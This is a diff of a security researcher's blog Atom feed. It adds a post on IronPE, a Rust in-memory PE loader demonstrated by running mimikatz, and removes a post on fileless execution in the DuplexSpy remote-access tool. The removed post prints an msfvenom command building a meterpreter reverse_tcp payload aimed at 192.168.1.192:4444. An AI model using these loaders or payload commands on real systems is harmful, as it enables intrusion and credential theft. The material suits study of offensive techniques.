@@ -6,7 +6,7 @@
   <link href="https://iss4cf0ng.github.io/atom.xml" rel="self"/>
   
   <link href="https://iss4cf0ng.github.io/"/>
-  <updated>2026-03-08T15:45:34.719Z</updated>
+  <updated>2026-03-10T09:02:41.123Z</updated>
   <id>https://iss4cf0ng.github.io/</id>
   
   <author>
@@ -15,6 +15,52 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>[Tools] IronPE—Minimal Windows PE manual loader written in Rust</title>
+    <link href="https://iss4cf0ng.github.io/2026/03/10/2026-3-10-IronPE/"/>
+    <id>https://iss4cf0ng.github.io/2026/03/10/2026-3-10-IronPE/</id>
+    <published>2026-03-10T08:59:46.000Z</published>
+    <updated>2026-03-10T09:02:41.123Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p><strong>IronPE</strong> is a minimal Windows PE manual loader written in Rust for both x86 and x64 PE files.</p><p>This project is a <strong>Rust reimplementation</strong> of my previous project <strong><a href="https://github.com/iss4cf0ng/dotNetPELoader">dotNetPELoader</a></strong>, which implemented a manual PE loader in C#.</p><p>The goal of IronPE is to explore how Windows loads Portable Executables internally and to demonstrate how this process can be implemented in Rust.</p><p align="center" class='item-img' data-src='https://iss4cf0ng.github.io/images/meme/natsu_cake.jpg'><img src="https://iss4cf0ng.github.io/images/meme/natsu_cake.jpg" width="200">  <br>  Waaaahhhhhhh!</p><p align="center">If you find this project useful or informative, a ⭐ would be appreciated!</p><h2 id="Disclaimer"><a href="#Disclaimer" class="headerlink" title="Disclaimer"></a>Disclaimer</h2><p>This project is intended for <strong>educational and research purposes only</strong>.</p><p>It is designed to help understand:</p><ul><li>Windows PE internals</li><li>Manual loading techniques</li><li>Reverse engineering concepts</li></ul><p align="center" class='item-img' data-src='https://iss4cf0ng.github.io/images/meme/mika_rollcake_hit.png'><img src="https://iss4cf0ng.github.io/images/meme/mika_rollcake_hit.png" width=200></p><h2 id="Features"><a href="#Features" class="headerlink" title="Features"></a>Features</h2><ul><li>Manual PE loading</li><li>Section mapping</li><li>Base relocations</li><li>Import resolution</li><li>Execute PE from memory</li><li>x86 and x64 PE support</li></ul><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>This project was inspired by my previous implementation:</p><ul><li><a href="https://github.com/iss4cf0ng/dotNetPELoader">dotNetPELoader</a> (C#)</li></ul><p>In that project, I implemented a PE loader using .NET and WinAPI.<br>IronPE rewrites the same concept in <strong>Rust</strong>, which provides better memory safety while still allowing low-level Windows API access.</p><p>The purpose of this project is <strong>educational</strong>, to better understand:</p><ul><li>PE file structure</li><li>Windows loader behavior</li><li>Manual PE mapping techniques</li></ul><h2 id="How-It-Works"><a href="#How-It-Works" class="headerlink" title="How It Works"></a>How It Works</h2><p>IronPE performs the following steps to execute a PE file from memory:<br>IronPE performs the following steps to execute a PE file from memory:</p><ol><li>Read PE file into memory</li><li>Parse PE headers</li><li>Allocate memory using <code>VirtualAlloc</code></li><li>Copy PE headers and sections</li><li>Apply <strong>base relocations</strong></li><li>Resolve <strong>imports</strong> using <code>LoadLibrary</code> and <code>GetProcAddress</code></li><li>Transfer execution to the <strong>Original Entry Point (OEP)</strong></li></ol><p>This process mimics the behavior of the Windows PE loader.</p><p>An x64 PE cannot be loaded by an x86 loader, and vice versa.</p><h2 id="Build"><a href="#Build" class="headerlink" title="Build"></a>Build</h2><p>Requirements:</p><ul><li>Rust (<code>cargo</code>, <code>rustc</code>)</li><li>Windows</li></ul><p>Build the project:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">cd IronPE<br>build.bat<br></code></pre></td></tr></table></figure></p><h2 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">IronPE.exe --coffee<br>IronPE.exe --x86 &lt;x86_pe_file&gt;<br>IronPE.exe --x64 &lt;x64_pe_file&gt;<br></code></pre></td></tr></table></figure><p>Example:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">IronPE.exe --x86 Win32\mimikatz.exe<br>IronPE.exe --x64 x64\mimikatz.exe<br></code></pre></td></tr></table></figure></p><h2 id="Demo-Running-mimikatz"><a href="#Demo-Running-mimikatz" class="headerlink" title="Demo (Running mimikatz)"></a>Demo (Running mimikatz)</h2><h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><p align="center" class='item-img' data-src='https://iss4cf0ng.github.io/images/article/2026-3-10-IronPE/1.png'><img src="https://iss4cf0ng.github.io/images/article/2026-3-10-IronPE/1.png" width=800></p><p align="center" class='item-img' data-src='https://iss4cf0ng.github.io/images/article/2026-3-10-IronPE/2.png'><img src="https://iss4cf0ng.github.io/images/article/2026-3-10-IronPE/2.png" width=800></p><hr><h3 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h3><p align="center" class='item-img' data-src='https://iss4cf0ng.github.io/images/article/2026-3-10-IronPE/3.png'><img src="https://iss4cf0ng.github.io/images/article/2026-3-10-IronPE/3.png" width=800></p><p align="center" class='item-img' data-src='https://iss4cf0ng.github.io/images/article/2026-3-10-IronPE/4.png'><img src="https://iss4cf0ng.github.io/images/article/2026-3-10-IronPE/4.png" width=800></p><hr><h3 id="Unmatched-Loader-and-PE-Architecture-Error"><a href="#Unmatched-Loader-and-PE-Architecture-Error" class="headerlink" title="Unmatched Loader and PE Architecture (Error)"></a>Unmatched Loader and PE Architecture (Error)</h3><p align="center" class='item-img' data-src='https://iss4cf0ng.github.io/images/article/2026-3-10-IronPE/5.png'><img src="https://iss4cf0ng.github.io/images/article/2026-3-10-IronPE/5.png" width=800></p><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING"></a>THANKS FOR READING</h1><p align="center" class='item-img' data-src='/images/meme/tea_party_sushi.jpg'><img src="/images/meme/tea_party_sushi.jpg" width=600></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;IronPE&lt;/strong&gt; is a m</summary>
+      
+    
+    
+    
+    <category term="Tools/IronPE" scheme="https://iss4cf0ng.github.io/categories/Tools-IronPE/"/>
+    
+    
+    <category term="Code" scheme="https://iss4cf0ng.github.io/tags/Code/"/>
+    
+    <category term="Coding" scheme="https://iss4cf0ng.github.io/tags/Coding/"/>
+    
+    <category term="Rust" scheme="https://iss4cf0ng.github.io/tags/Rust/"/>
+    
+    <category term="Windows" scheme="https://iss4cf0ng.github.io/tags/Windows/"/>
+    
+    <category term="PE File" scheme="https://iss4cf0ng.github.io/tags/PE-File/"/>
+    
+    <category term="Fileless Execution" scheme="https://iss4cf0ng.github.io/tags/Fileless-Execution/"/>
+    
+    <category term="PE Loader" scheme="https://iss4cf0ng.github.io/tags/PE-Loader/"/>
+    
+    <category term="PE Format" scheme="https://iss4cf0ng.github.io/tags/PE-Format/"/>
+    
+    <category term="Fileless" scheme="https://iss4cf0ng.github.io/tags/Fileless/"/>
+    
+    <category term="Executable" scheme="https://iss4cf0ng.github.io/tags/Executable/"/>
+    
+    <category term="Windows Rust" scheme="https://iss4cf0ng.github.io/tags/Windows-Rust/"/>
+    
+    <category term="Fileless Malware" scheme="https://iss4cf0ng.github.io/tags/Fileless-Malware/"/>
+    
+  </entry>
   
   <entry>
     <title>[Tools] OpenShell v1.0.0—A lightweight, open-source reverse shell management server written in Go.</title>
@@ -783,38 +829,6 @@
     <category term="x86" scheme="https://iss4cf0ng.github.io/tags/x86/"/>
     
     <category term="x64" scheme="https://iss4cf0ng.github.io/tags/x64/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>[DuplexSpy] Fileless Execution</title>
-    <link href="https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyFilelessExec/"/>
-    <id>https://iss4cf0ng.github.io/2026/02/03/2026-2-3-DuplexSpyFilelessExec/</id>
-    <published>2026-02-03T15:42:02.000Z</published>
-    <updated>2026-02-22T17:23:04.720Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>This article demonstrates how to use the <strong>Fileless Execution</strong> feature of DuplexSpy.</p><p>This feature allows you to execute a PE (Portable Executable) file on a compromised machine without writing it to disk.</p><h1 id="Principle"><a href="#Principle" class="headerlink" title="Principle"></a>Principle</h1><p>The C2 server sends raw PE file bytes to the compromised machine. The DuplexSpy payload loads these PE bytes into memory and executes them. When the payload receives a fileless execution command, it creates a new process to execute the PE entirely from memory.</p><p>The figure below illustrates the execution flow:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/procedure.svg'><img src="/images/article/tools/duplexspy/fileless/procedure.svg" width="1000"></p><p>The x64 version of PE loader is based on the implementation by <a href="https://github.com/S3cur3Th1sSh1t/Creds/blob/master/Csharp/PEloader.cs">Casey Smith</a>. However, I have developed the <a href="https://github.com/iss4cf0ng/dotNetPELoader">x86 version</a> in case the C# payload uses the x86 platform.</p><p>Note that a loader can only execute PE files that match its architecture. An x64 loader cannot execute x86 PE files and vice versa. Make sure you identify the architecture of the target PE and select the matched loader.</p><p align="center" class='item-img' data-src='/images/meme/nagisa_neko.png'><img src="/images/meme/nagisa_neko.png" width="300"></p><h1 id="Getting-Started"><a href="#Getting-Started" class="headerlink" title="Getting Started"></a>Getting Started</h1><h2 id="Example-1-x64-msfvenom"><a href="#Example-1-x64-msfvenom" class="headerlink" title="Example 1 - x64 msfvenom"></a>Example 1 - x64 msfvenom</h2><p>First, check the architecture of the executed payload:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/check.1.png'><img src="/images/article/tools/duplexspy/fileless/check.1.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/check.2.png'><img src="/images/article/tools/duplexspy/fileless/check.2.png" width="700"></p><p>Generate an x64 Messagebox payload:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ msfvenom -p windows/x64/messagebox TEXT=&quot;msf hello world&quot; -f exe &gt; x64.exe<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/msf.1.png'><img src="/images/article/tools/duplexspy/fileless/msf.1.png" width="700"></p><p>The <code>x64.exe</code> is executed successfully without being written to disk. This is fileless execution. Next, check the process list:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">tasklist | find &quot;client.exe&quot;<br></code></pre></td></tr></table></figure><p>Here <code>client.exe</code> is your DuplexSpy payload.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/msf.2.png'><img src="/images/article/tools/duplexspy/fileless/msf.2.png" width="700"></p><p>Two instance of <code>client.exe</code> (the DuplexSpy payload) are running. One instance maintains communication with the C2 server, while the other is for executing the filesless payload.</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/msf.3.png'><img src="/images/article/tools/duplexspy/fileless/msf.3.png" width="700"></p><h2 id="Example-2-x86-meterpreter"><a href="#Example-2-x86-meterpreter" class="headerlink" title="Example 2 - x86 meterpreter"></a>Example 2 - x86 meterpreter</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 lhost=192.168.1.192 lport=4444 -f exe -a x86 &gt; x86.exe<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/msf.4.png'><img src="/images/article/tools/duplexspy/fileless/msf.4.png" width="700"></p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/msf.5.png'><img src="/images/article/tools/duplexspy/fileless/msf.5.png" width="700"></p><h2 id="Example-3-x86-calc-exe"><a href="#Example-3-x86-calc-exe" class="headerlink" title="Example 3 - x86 calc.exe"></a>Example 3 - x86 calc.exe</h2><p>Now, try executing a more complex application:</p><p align="center" class='item-img' data-src='/images/article/tools/duplexspy/fileless/calc.1.png'><img src="/images/article/tools/duplexspy/fileless/calc.1.png" width="500"></p><h1 id="THANKS-FOR-READING"><a href="#THANKS-FOR-READING" class="headerlink" title="THANKS FOR READING!"></a>THANKS FOR READING!</h1><p align="center" class='item-img' data-src='/images/meme/mika_nagisa_rollcake.gif'><img src="/images/meme/mika_nagisa_rollcake.gif" width="500"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;This article demonstrates how </summary>
-      
-    
-    
-    
-    <category term="Tools/DuplexSpy" scheme="https://iss4cf0ng.github.io/categories/Tools-DuplexSpy/"/>
-    
-    
-    <category term="DuplexSpy" scheme="https://iss4cf0ng.github.io/tags/DuplexSpy/"/>
-    
-    <category term="RAT" scheme="https://iss4cf0ng.github.io/tags/RAT/"/>
-    
-    <category term="Documentation" scheme="https://iss4cf0ng.github.io/tags/Documentation/"/>
-    
-    <category term="Tools" scheme="https://iss4cf0ng.github.io/tags/Tools/"/>
-    
-    <category term="Fileless Execution" scheme="https://iss4cf0ng.github.io/tags/Fileless-Execution/"/>
     
   </entry>
   
